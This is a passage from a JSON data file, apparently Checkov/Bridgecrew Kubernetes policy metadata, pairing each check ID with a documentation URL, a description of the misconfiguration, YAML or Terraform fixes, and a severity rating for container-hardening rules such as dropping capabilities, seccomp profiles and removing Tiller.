true\n+                        runAsUser: <specific user>\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n        securityContext:\n+           runAsNonRoot: true\n+               runAsUser: <specific user>\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_24": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_23",
        "description": "Containers with added capability are allowed\nDescription\nUsing the Linux capabilities feature you can grant certain privileges to a process without granting all the privileges of the root user. Added capabilities entitle containers in a pod with additional privileges that can be used to change core processes and networking settings of a cluster. We recommend you only use privileges that are required for the proper function of the cluster.\nTo add or remove Linux capabilities for a container, you can include the capabilities field in the securityContext section of the container manifest.\nFix - Buildtime\nKubernetes\n\nResource: PodSecurityPolicy\nArgument: allowedCapabilities (Optional)\nProvides a list of capabilities that may be added to a container beyond the default set.\n\nYAMLapiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: <policy name>\nspec:\n- allowedCapabilities:\n\nTo use a PodSecurityPolicy resource, the requesting user or target pod\u2019s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use RBAC, a standard Kubernetes authorization mode.\nA Role or ClusterRole needs to grant access to use the desired policies. \nKind: ClusterRole\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: <role name>\nrules:\n- apiGroups: ['policy']\n  resources: ['podsecuritypolicies']\n  verbs:     ['use']\n  resourceNames:\n  - <policy name>\n\nThe ClusterRole is then bound to the authorized service(s):\nKind: ClusterRoleBinding\nYAMLapiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <binding name>\nroleRef:\n  kind: ClusterRole\n  name: <role name>\n  apiGroup: rbac.authorization.k8s.io\nsubjects:\n- kind: ServiceAccount\n  name: <authorized service account name>\n  namespace: <authorized pod namespace>\n",
        "severity": "LOW"
    },
    "CKV_K8S_25": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_24",
        "description": "Admission of containers with added capability is not minimized\nDescription\nContainers run with a default set of capabilities as assigned by the Container Runtime. By default this can include potentially dangerous capabilities. With Docker as the container runtime the NET_RAW capability is enabled which may be misused by malicious containers. Ideally, all containers should drop this capability.\nFix - Buildtime\nTerraform\nGoresource \"kubernetes_pod\" \"pass2\" {\n  metadata {\n    name = \"terraform-example\"\n  }\n\n  spec {\n    container {\n      image = \"nginx:1.7.9\"\n      name  = \"example22\"\n\n      security_context {\n        capabilities {\n          add = []\n        }\n      }\n\n      env {\n        name  = \"environment\"\n        value = \"test\"\n      }\n\n      port {\n        container_port = 8080\n      }\n\n      liveness_probe {\n        http_get  {\n          path = \"/nginx_status\"\n          port = 80\n\n          http_header {\n            name  = \"X-Custom-Header\"\n            value = \"Awesome\"\n          }\n        }\n\n        initial_delay_seconds = 3\n        period_seconds        = 3\n      }\n    }\n\n    dns_config {\n      nameservers = [\"1.1.1.1\", \"8.8.8.8\", \"9.9.9.9\"]\n      searches    = [\"example.com\"]\n\n      option {\n        name  = \"ndots\"\n        value = 1\n      }\n\n      option {\n        name = \"use-vc\"\n      }\n    }\n\n    dns_policy = \"None\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_K8S_26": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_25",
        "description": "hostPort is specified\nDescription\nThe hostPort setting applies to the Kubernetes containers. The container port will be exposed to the external network at :, where the hostIP is the IP address of the Kubernetes node where the container is running, and the hostPort is the port requested by the user.\nWe recommend that you do not specify a hostPort for a pod unless it is absolutely necessary. When you bind a pod to a hostPort, it limits the number of places the pod can be scheduled, because each <hostIP, hostPort, protocol> combination must be unique. \n\ud83d\udea7WarningIf you do not specify the hostIP and protocol explicitly, Kubernetes will use 0.0.0.0 as the default hostIP and TCP as the default protocol. This will expose your host to the internet.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: hostPort (Optional)\nDefines the number of port to expose on the host.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    ports:\n-    hostPort: <port>\n",
        "severity": "LOW"
    },
    "CKV_K8S_27": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_26",
        "description": "Mounting Docker socket daemon in a container is not limited\nDescription\nDocker runs through a non-networked UNIX socket. In daemon mode it only allows connections from clients authenticated by a certificate signed by that CA. This socket can be mounted by other containers unless correct permissions are in place. Once mounted, the socket can be used to spin up any container, create new images, or shut down existing containers.\nTo protect the docker socket daemon running in a container, set appropriate SELinux/AppArmor profiles to limit containers mounting this socket.\nFix - Buildtime\nKubernetes\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: volumes:hostPath (Optional)\nMounts a file or directory from the host node\u2019s filesystem into your Pod. If the path is set to /var/lib/docker, the container has access to Docker internals.\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n    volumes:\n        -name: <volume name>\n        hostPath:\n-           path: /var/run/docker.sock\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          volumes:\n            -name: <volume name>\n              hostPath:\n -                      path: /var/run/docker.sock\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n      volumes:\n        -name: <volume name>\n          hostPath:\n -                  path: /var/run/docker.sock\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_28": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_27",
        "description": "Admission of containers with NET_RAW capability is not minimized\nDescription\nNET_RAW capability allows the binary to use RAW and PACKET sockets as well as binding to any address for transparent proxying. The ep stands for \u201ceffective\u201d (active) and \u201cpermitted\u201d (allowed to be used). \nWith Docker as the container runtime NET_RAW capability is enabled by default and may be misused by malicious containers. We recommend you define at least one PodSecurityPolicy (PSP) to prevent containers with NET_RAW capability from launching.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: securityContext:capabilities:drop (Optional)\nCapabilites field allows granting certain privileges to a process without granting all the privileges of the root user. when drop includes ALL or NET_RAW, the NET_RAW capability is disabled.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n      capabilities:\n        drop:\n+        - NET_RAW\n+        - ALL\n",
        "severity": "LOW"
    },
    "CKV_K8S_30": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_28",
        "description": "securityContext is not applied to pods and containers in container context\nDescription\nsecurityContext defines privilege and access control settings for your pod or container, and holds security configurations that will be applied to a container. Some fields are present in both securityContext and PodSecurityContext,  when both are set, securityContext takes precedence. \nWell-defined privilege and access control settings will enhance assurance that your pod is running with the properties it requires to function.\nFix - Buildtime \nKubernetes\n\nResource:  Container / Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: securityContext (Optional)\nA field that defines privilege and access control settings for your Pod or Container.\n\nContainerPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n+   securityContext:\napiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n+  securityContext:\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n+          securityContext:\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n+       securityContext:\n",
        "severity": "LOW"
    },
    "CKV_K8S_31": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_29",
        "description": "seccomp is not set to Docker/Default or Runtime/Default\nDescription\nSecure computing mode (seccomp) is a Linux kernel feature used to restrict actions available within the container. The seccomp() system call operates on the seccomp state of the calling process. The default seccomp profile provides a reliable setting for running containers with seccomp and disables non-essential system calls.\nFix - Buildtime\nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: securityContext: seccompProfile: type: (Optional: Kubernetes > v1.19)\nAddition of seccompProfile type: RuntimeDefault or DockerDefault \n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n  securityContext:\n+    seccompProfile:\n+      type: RuntimeDefault\n       or\n+      type: DockerDefault\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          securityContext:\n+            seccompProfile:\n+              type: RuntimeDefault\n               or\n+              type: DockerDefault\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n      securityContext:\n+        seccompProfile:\n+          type: RuntimeDefault\n           or\n+          type: DockerDefault\n",
        "severity": "LOW"
    },
    "CKV_K8S_32": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_30",
        "description": "seccomp profile is not set to Docker/Default or Runtime/Default\nDescription\nSecure computing mode (seccomp) is a Linux kernel feature used to restrict actions available within the container. The seccomp() system call operates on the seccomp state of the calling process. The default seccomp profile provides a reliable setting for running containers with seccomp and disables non-essential system calls.\nFix - Buildtime\nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: metadata:annotations (Optional)\nAnnotations attach arbitrary non-identifying metadata to objects.\n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\n  annotations:\n+   seccomp.security.alpha.kubernetes.io/pod: \"docker/default\" \n    or\n+   seccomp.security.alpha.kubernetes.io/pod: \"runtime/default\"\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        metadata:\n          annotations:\n +                  seccomp.security.alpha.kubernetes.io/pod: \"docker/default\" \n    or\n +                seccomp.security.alpha.kubernetes.io/pod: \"runtime/default\"\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    metadata:\n        annotations:\n+               seccomp.security.alpha.kubernetes.io/pod: \"docker/default\" \n    or\n+               seccomp.security.alpha.kubernetes.io/pod: \"runtime/default\"\n",
        "severity": "LOW"
    },
    "CKV_K8S_33": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_31",
        "description": "Kubernetes dashboard is deployed\nDescription \nThe Terraform provider for Azure enables the capability to disable the Kubernetes dashboard on an AKS cluster. This is achieved by providing the Kubernetes dashboard as an AKS add-on, similar to the Azure Monitor, for containers integration, AKS virtual nodes, and the HTTP application routing.\nIn mid-2019 Tesla was hacked where their kube-dashboard was exposed to the internet. Hackers browsed around, found credentials, and deployed pods running bitcoin mining software. We recommend you disable the kube-dashboard if it's not needed, to prevent the need to manage its individual access interface and limit it as an attack vector.\nFix - Buildtime\nKubernetes\n\nResource: Container\nArguments:\nlabels:app / k8s-app - specifies the app label for the pod\nimage - defines the image used by the container\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\n  labels:\n-   app: kubernetes-dashboard\n-   k8s-app: kubernetes-dashboard\nspec:\n  containers:\n  - name: <container name>\n-   image: kubernetes-dashboard\n-   image: kubernetesui\n",
        "severity": "LOW"
    },
    "CKV_K8S_34": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_32",
        "description": "Tiller (Helm V2) is deployed\nDescription\nTiller (Helm v2) is the in-cluster component of Helm. It interacts directly with the Kubernetes API server to install, upgrade, query, and remove Kubernetes resources. It also stores the objects that represent releases. Its permissive configuration could grant the users a broad range of permissions.\nNew versions of Kubernetes and Helm v3 have made Tiller obsolete, with its over permissive function in existing workloads remaining a security liability.\nConsider upgrading to use Helm v3, which only runs on client machines. Not all charts may support Helm 3, but the number that do is growing rapidly.\nFix - Runtime \nCLI Command\nhelm reset\nOr, use helm reset --force to force the removal if charts are installed. You still need to remove the releases manually.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArguments:\nlabels:app / name - specifies the app label for the pod\nimage - defines the image used by the container\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\n  labels:\n-   app: helm\n-   name: tiller\nspec:\n  containers:\n  - name: <container name>\n-   image: tiller\n",
        "severity": "LOW"
    },
    "CKV_K8S_35": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_33",
        "description": "Secrets used as environment variables\nDescription\nSecrets can be mounted as data volumes or exposed as environment variables and used by a container in a pod to interact with external systems on your behalf. Secrets can also be used by other parts of the system, without being directly exposed to the pod. \nBenefits for storing secrets as files include: setting file permissions, projects of secret keys to specific paths, and consuming secret values from volumes.\nFix - Buildtime\nKubernetes\n\nResource: Container\nArguments:\nenv:valueFrom:secretKeyRef - uses a secret in an environment variable in a Pod\nenvFrom:secretRef - defines all of the secret\u2019s data as the container environment variables\n\nvalueFromenvFromapiVersion: v1\nkind: Pod\nmetadata:\n  name: <pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    env:\n      - name: <env name>\n        valueFrom:\n-         secretKeyRef:\n-           name: <secret key name>\n-           key: <secret key>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: <pod name>\nspec:\n  containers:\n    - name: <contianer name>\n      image: <image>\n      envFrom:\n-     - secretRef:\n-         name: <secret name>\n",
        "severity": "LOW"
    },
    "CKV_K8S_37": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_34",
        "description": "Admission of containers with capabilities assigned is not limited\nDescription\nDocker has a default list of capabilities that are allowed for each container of a pod. The containers use the capabilities from this default list, but pod manifest authors can alter it by requesting additional capabilities, or dropping some of the default capabilities.\nLimiting the admission of containers with capabilities ensures that only a small number of containers have extended capabilities outside the default range. This helps ensure that if a container becomes compromised it is unable to provide a productive path for an attacker to move laterally to other containers in the pod.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: securityContext:capabilities:drop (Optional)\nCapabilites field allows granting certain privileges to a process without granting all the privileges of the root user. when drop includes ALL, all of the root privileges are disabled for that container.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n      capabilities:\n        drop:\n+         - ALL\n",
        "severity": "LOW"
    },
    "CKV_K8S_38": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_35",
        "description": "Service account tokens are not mounted where necessary\nDescription\nOne way to authenticate the API is by using the Service Account token. ServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod. Every service account has a secret related to it, this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.\nThis Service Account token is being used during the authentication stage and can become useful for  attackers if the service account is privileged and they have access to such a token. With this token an attacker can easily impersonate the service account and use REST APIs.\nFix - Buildtime\nKubernetes\n\nResource:  Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: automountServiceAccountToken (Optional)\nWhen set to false, you can opt out of automounting API credentials for a service account.\n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n+  automountServiceAccountToken: false\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n+           automountServiceAccountToken: false\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n+       automountServiceAccountToken: false\n",
        "severity": "LOW"
    },
    "CKV_K8S_39": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_36",
        "description": "CAP_SYS_ADMIN Linux capability is used\nDescription\nCapabilities permit certain named root actions without giving full root access and are considered a  fine-grained permissions model. \nWe recommend all capabilities should be dropped from a pod, with only those required added back. There are a large number of capabilities, with CAP_SYS_ADMIN bounding most. CAP_SYS_ADMIN is a highly privileged access level equivalent to root access and should generally be avoided.\nFix - Buildtime \nKubernetes\n\nResource:  Container\nArgument: securityContext:capabilities:add (Optional)\nAdd capabilities field allows granting certain privileges to a process. \n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n        capabilities:\n            add:\n-               -SYS_ADMIN\n",
        "severity": "HIGH"
    },
    "CKV_K8S_40": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_37",
        "description": "Containers do not run with a high UID\nDescription\nLinux namespaces provide isolation for running processes and limits access to system resources. To prevent privilege-escalation attacks from within a container, we recommend that you configure your container\u2019s applications to run as unprivileged users. The mapped user is assigned a range of UIDs which function within the namespace as normal UIDs from 0 to 65536, but have no privileges on the host machine itself. \nIf a process attempts to escalate privilege outside of the namespace, the process is running as an unprivileged high-number UID on the host, not mapped to a real user. This means the process has no privileges on the host system and cannot be attacked by this method.\nThis check will trigger below UID 10,000 as common linux distributions will assign UID 1000 to the first non-root, non system user and 1000 users should provide a reasonable buffer.\nFix - Buildtime\nKubernetes\n\nResource: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: runAsUser (Optional)\nSpecifies the User ID that processes within the container and/or pod run with.\n\nPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n+     runAsUser: <UID higher then 10000>\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: <container name>\n            image: <image>\n            securityContext:\n+             runAsUser: <UID higher then 10000>\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n      containers:\n      - name: <container name>\n        image: <image>\n        securityContext:\n          runAsUser: <UID higher then 10000>\n",
        "severity": "LOW"
    },
    "CKV_K8S_41": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_38",
        "description": "Default service accounts are actively used\nDescription\nEvery Kubernetes installation has a service account called default that is associated with every running pod. Similarly, to enable pods to make calls to the internal API Server endpoint, there is a ClusterIP service called Kubernetes. This combination makes it possible for internal processes to call the API endpoint.\nWe recommend that users create their own user-managed service accounts and grant the appropriate roles to each service account.\nFix - Buildtime \nKubernetes\nOption 1\n\nResource: ServiceAccount\nArgument: If service name is set to default, automountServiceAccountToken should be set to false in order to opt out of automounting API credentials for a service account.\n\ndefault servicenon-default serviceapiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: default\n+ automountServiceAccountToken: false\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n+ name: <service name>\n\nOption 2\n\nResource: RoleBinding / ClusterRoleBinding\nArgument:\nRoleBinding grants the permissions defined in a role to a user or set of users within a specific namespace.\nClusterRoleBinding grants that access cluster-wide. To avoid activating  the default service account, it should not be used as a subject in RoleBinding or ClusterRoleBinding resources. \n\nRoleBindingClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: <name>\nsubjects:\n-- kind: ServiceAccount\n-  name: default\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <name>\nsubjects:\n-- kind: ServiceAccount\n-  name: default\n",
        "severity": "LOW"
    },
    "CKV_K8S_43": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_39",
        "description": "Images are not selected using a digest\nDescription\nIn some cases you may prefer to use a fixed version of an image, rather than update to newer versions. Docker enables you to pull an image by its digest, specifying exactly which version of an image to pull. \nPulling using a digest allows you to \u201cpin\u201d an image to that version, and guarantee that the image you\u2019re using is always the same. Digests also prevent race-conditions; if a new image is pushed while a deploy is in progress, different nodes may be pulling the images at different times, so some nodes have the new image, and some have the old one. Services automatically resolve tags to digests, so you don't need to manually specify a digest. \nFix - Runtime \nCLI Command\nTo make sure the container always uses the same version of the image, you can specify its digest; replace <image-name>:<tag> with <image-name>@<digest> (for example, [email\u00a0protected]:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2).\nThe digest uniquely identifies a specific version of the image, so it is never updated by Kubernetes unless you change the digest value.\nFix - Buildtime \nKubernetes\n\nResource: image\nArgument: digest \n\nContainerimageapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: [email\u00a0protected]:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2\n{\n      \"creator\": 7,\n      \"id\": 2110,\n      \"image_id\": null,\n      \"images\": [\n        {\n          \"architecture\": \"amd64\",\n          \"features\": \"\",\n          \"variant\": null,\n+         \"digest\": \"sha256:1ae98b2c895d1ceeba8913ff79f422f005b7f967a311da520a88ac89180b4c39\",\n          \"os\": \"linux\",\n          \"os_features\": \"\",\n          \"os_version\": null,\n          \"size\": 87342331\n        }\n      ],\n      \"last_updated\": \"2017-04-06T20:16:24.015937Z\",\n      \"last_updater\": 2215,\n      \"last_updater_username\": \"stackbrew\",\n      \"name\": \"centos5\",\n      \"repository\": 54,\n      \"full_size\": 87342331,\n      \"v2\": true\n    }\n",
        "severity": "LOW"
    },
    "CKV_K8S_45": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_40",
        "description": "Tiller (Helm V2) deployment is accessible from within the cluster\nDescription\nTiller (Helm v2) is the in-cluster component of Helm. It interacts directly with the Kubernetes API server to install, upgrade, query, and remove Kubernetes resources. It also stores the objects that represent releases. Its permissive configuration could grant the users a broad range of permissions.\nHelm v3 removes Tiller, and it is recommended that you upgrade: see Ensure Tiller (Helm V2) Is Not Deployed. However, this is not always feasible.\nRestricting access to Tiller from within the cluster limits the abilities of a compromised pod or anonymous user in the cluster.\nFix - Runtime \nCLI Commands\nShellkubectl -n kube-system patch deployment tiller-deploy --patch '\nspec:\n  template:\n    spec:\n      containers:\n        - name: tiller\n          ports: []\n          args: [\"--listen=localhost:44134\"]\n'\n\nFix - Buildtime \nKubernetes\n\nResource: Container\n\nYAMLapiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tiller\n  labels:\n    app: tiller\nspec:\n  progressDeadlineSeconds: 600\n  replicas: 1\n  revisionHistoryLimit: 10\n  selector:\n    matchLabels:\n      app: helm\n      name: tiller\n  template:\n    metadata:\n      creationTimestamp: null\n      labels:\n        app: helm\n        name: tiller\n    spec:\n      automountServiceAccountToken: true\n      containers:\n+     - args:\n+       - --listen=localhost:44134\n        env:\n        - name: TILLER_NAMESPACE\n          value: kube-system\n        - name: TILLER_HISTORY_MAX\n          value: \"0\"\n        image: gcr.io/kubernetes-helm/tiller:v2.16.9\n        name: tiller\n-       ports:\n-       - containerPort: 44134\n-         name: tiller\n-         protocol: TCP\n-       - containerPort: 44135\n-         name: http\n-         protocol: TCP\n",
        "severity": "LOW"
    },
    "CKV_K8S_44": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_41",
        "description": "Tiller (Helm v2) service is not deleted\nDescription\nTiller (Helm v2) is the in-cluster component of Helm. It interacts directly with the Kubernetes API server to install, upgrade, query, and remove Kubernetes resources. It also stores the objects that represent releases. Its permissive configuration could grant the users a broad range of permissions.\nHelm v3 removes Tiller, and it is recommended that you upgrade: see Ensure Tiller (Helm V2) Is Not Deployed. However, this is not always feasible.\nRestricting access to Tiller from within the cluster limits the abilities of a compromised pod or anonymous user in the cluster.\nAfter restricting connectivity to the Tiller deployment, the Tiller service can be deleted.\nFix - Runtime \nCLI Commands\nkubectl -n kube-system delete service tiller-deploy\nFix - Buildtime \nKubernetes\n\nResource: Service\n\nYAML-- apiVersion: v1\n-  kind: Service\n-  metadata:\n-    labels:\n-      app: helm\n-      name: tiller\n-    name: tiller-deploy\n-    namespace: kube-system\n-  spec:\n-    ports:\n-    - name: tiller\n-      port: 44134\n-      protocol: TCP\n-      targetPort: tiller\n-    selector:\n-      app: helm\n-      name: tiller\n-    type: ClusterIP\n",
        "severity": "LOW"
    },
    "CKV_K8S_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-containers-do-not-run-with-allowprivilegeescalation",
        "description": "Containers run with AllowPrivilegeEscalation\nDescription\nThe AllowPrivilegeEscalation Pod Security Policy controls whether or not a user is allowed to set the security context of a container to True. Setting it to False ensures that no child process of a container can gain more privileges than its parent.\nWe recommend you to set AllowPrivilegeEscalation to False, to ensure RunAsUser commands cannot bypass their existing sets of permissions.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: allowPrivilegeEscalation (Optional)\nIf false, the pod can not request to allow privilege escalation. Default to true.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n+      allowPrivilegeEscalation: false\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_29": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_28",
        "description": "securityContext is not applied to pods and containers in container context\nDescription\nsecurityContext defines privilege and access control settings for your pod or container, and holds security configurations that will be applied to a container. Some fields are present in both securityContext and PodSecurityContext,  when both are set, securityContext takes precedence. \nWell-defined privilege and access control settings will enhance assurance that your pod is running with the properties it requires to function.\nFix - Buildtime \nKubernetes\n\nResource:  Container / Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob\nArgument: securityContext (Optional)\nA field that defines privilege and access control settings for your Pod or Container.\n\nContainerPodCronJobOtherapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n+   securityContext:\napiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n+  securityContext:\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: <name>\nspec:\n  schedule: <>\n  jobTemplate:\n    spec:\n      template:\n        spec:\n+          securityContext:\napiVersion: <>\nkind: <kind>\nmetadata:\n  name: <name>\nspec:\n  template:\n    spec:\n+       securityContext:\n",
        "severity": "LOW"
    },
    "CKV_K8S_36": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_34",
        "description": "Admission of containers with capabilities assigned is not limited\nDescription\nDocker has a default list of capabilities that are allowed for each container of a pod. The containers use the capabilities from this default list, but pod manifest authors can alter it by requesting additional capabilities, or dropping some of the default capabilities.\nLimiting the admission of containers with capabilities ensures that only a small number of containers have extended capabilities outside the default range. This helps ensure that if a container becomes compromised it is unable to provide a productive path for an attacker to move laterally to other containers in the pod.\nFix - Buildtime \nKubernetes\n\nResource: Container\nArgument: securityContext:capabilities:drop (Optional)\nCapabilites field allows granting certain privileges to a process without granting all the privileges of the root user. when drop includes ALL, all of the root privileges are disabled for that container.\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <Pod name>\nspec:\n  containers:\n  - name: <container name>\n    image: <image>\n    securityContext:\n      capabilities:\n        drop:\n+         - ALL\n",
        "severity": "LOW"
    },
    "CKV_K8S_42": {
        "url": "https://docs.bridgecrew.io/docs/ensure-default-service-accounts-are-not-actively-used",
        "description": "Default Kubernetes service accounts are actively used by bounding to a role or cluster role\nDescription\nEvery Kubernetes installation has a service account called default that is associated with every running pod. Similarly, to enable pods to make calls to the internal API Server endpoint, there is a ClusterIP service called Kubernetes. This combination makes it possible for internal processes to call the API endpoint.\nWe recommend that users create their own user-managed service accounts and grant the appropriate roles to each service account.\nFix - Buildtime \nKubernetes\nOption 1\n\nResource: ServiceAccount\nArgument: If service name is set to default, automountServiceAccountToken should be set to false in order to opt out of automounting API credentials for a service account.\n\ndefault servicenon-default serviceapiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: default\n+ automountServiceAccountToken: false\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n+ name: <service name>\n\nOption 2\n\nResource: RoleBinding / ClusterRoleBinding\nArgument:\nRoleBinding grants the permissions defined in a role to a user or set of users within a specific namespace.\nClusterRoleBinding grants that access cluster-wide. To avoid activating  the default service account, it should not be used as a subject in RoleBinding or ClusterRoleBinding resources. \n\nRoleBindingClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: <name>\nsubjects:\n-- kind: ServiceAccount\n-  name: default\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: <name>\nsubjects:\n-- kind: ServiceAccount\n-  name: default\n",
        "severity": "LOW"
    },
    "CKV_K8S_14": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_13",
        "description": "Image tag is not set to Fixed\nDescription\nYou can add a :fixed tag to a container image, making it easier to determine what it contains, for example to specify the version. Container image tags and digests are used to refer to a specific version or instance of a container image.\nWe recommend you avoid using the :latest and :blank tags when deploying containers in production as it is harder to track which version of the image is running, and more difficult to roll back properly.\nFix - Buildtime\nKubernetes\nResource: Container\nArgument: image:tag (Optional)\nDefines the image version by a specific number or by using latest. \nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n+   image: <image>:<image version>\n-   image: <image>\n-   image: <image>:latest\n",
        "severity": "LOW"
    },
    "CKV_K8S_15": {
        "url": "https://docs.bridgecrew.io/docs/bc_k8s_14",
